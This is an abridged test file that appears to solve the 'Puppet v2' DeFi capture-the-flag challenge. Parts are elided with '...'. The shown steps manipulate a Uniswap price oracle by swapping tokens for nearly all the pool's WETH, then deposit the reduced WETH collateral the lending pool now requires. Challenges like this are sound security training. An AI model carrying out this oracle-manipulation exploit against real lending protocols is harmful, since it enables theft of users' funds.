...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Execution', async function () {
        ...
        await uniswapRouter.connect(player).swapTokensForExactETH(
            UNISWAP_INITIAL_WETH_RESERVE - (1n*10n**17n),
            PLAYER_INITIAL_TOKEN_BALANCE,
        ...
        const wethToAttack = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        await weth.connect(player).deposit({value: wethToAttack});
